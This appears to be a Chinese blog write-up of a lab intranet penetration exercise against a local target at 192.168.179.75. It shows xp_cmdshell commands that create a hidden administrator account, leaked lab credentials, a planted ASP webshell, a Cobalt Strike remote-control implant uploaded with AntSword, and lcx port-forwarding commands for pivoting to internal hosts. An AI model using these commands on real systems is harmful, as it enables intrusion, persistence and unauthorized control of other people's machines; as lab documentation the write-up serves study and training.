---
title: lcx端口转发
date: 2021-09-03 16:39:51
tags:
---

## 内网渗透:端口转发

靶场地址

http://192.168.179.75/1.asp



通过fscan扫描得到mssql账号秘密，Navicat链接登录数据库，whoami查看，当前权限为system，创建账号gd13$，密码admin@123，添加到administrator组，通过该账号远程登录，在www目录下写入一句话木马asp，打开kali蚁剑链接



![image-20210831191818764](lcx/image-20210831191818764.png)

fscan 扫描目标ip  

`/home/kali/cs4.2/tools/fscan_amd64 -h 192.168.179.75`

![image-20210831192054560](lcx/image-20210831192054560.png)

![image-20210831194028029](lcx/image-20210831194028029.png)

`exec('xp_cmdshell "whoami"')`

添加用户 gd13$  admin@123 

`exec('xp_cmdshell "net user gd13$ admin@123 /add"')`

![image-20210831202425448](lcx/image-20210831202425448.png)

![image-20210831202530309](\lcx/image-20210831202530309.png)

`exec('xp_cmdshell "net localgroup administrators gd13$ /add"')`

`exec('xp_cmdshell "net localgroup administrators"')`

![image-20210831202648860](\lcx/image-20210831202648860.png)

![image-20210831203004613](\lcx/image-20210831203004613.png)

查看user表 里面有管理员账户名密码，虽然解密成功但是，禁止远程登录

![image-20210831203016345](\lcx/image-20210831203016345.png)

admin 	qwer1234!@#$

![image-20210831204542590](lcx/image-20210831204542590.png)

bao  bao123

![image-20210831203215306](\lcx/image-20210831203215306.png)

![image-20210831205122155](\lcx/image-20210831205122155.png)



kali中打开cs 链接vps服务器

![image-20210903204618071](\lcx/image-20210903204618071.png)

![image-20210903204838431](lcx/image-20210903204838431.png)

生成Windows版的远控程序

![image-20210903205111769](lcx/image-20210903205111769.png)

![image-20210903205153499](lcx/image-20210903205153499.png)

使用蚁剑上传远控程序

![image-20210903205420939](lcx/image-20210903205420939.png)

双击远控程序，在cs中查看

![image-20210903210054589](lcx/image-20210903210054589.png)

![image-20210903210314507](\lcx/image-20210903210314507.png)

![image-20210903210456317](\lcx/image-20210903210456317.png)

`shell C:\www\lcx.exe -tran 3333 192.168.1.107 8080`

![image-20210903211135544](lcx/image-20210903211135544.png)

![image-20210903211948437](\lcx/image-20210903211948437.png)



![image-20210903212024618](\lcx/image-20210903212024618.png)

转发成功，访问75的3333端口，107的8080端口转发成功



![image-20210903212112116](\lcx/image-20210903212112116.png)

![image-20210903212704462](\lcx/image-20210903212704462.png)

![image-20210903212729352](\lcx/image-20210903212729352.png)

use18

`shell C:\www\lcx.exe -tran 4444 192.168.22.187 4444`

![image-20210903222630836](lcx/image-20210903222630836.png)

![image-20210903223233650](lcx/image-20210903223233650.png)

![image-20210903225319610](lcx/image-20210903225319610.png)

![image-20210903225342838](lcx/image-20210903225342838.png)

设置用户名和密码Tomcat

![image-20210903230024732](lcx/image-20210903230024732.png)

![image-20210903230155364](lcx/image-20210903230155364.png)

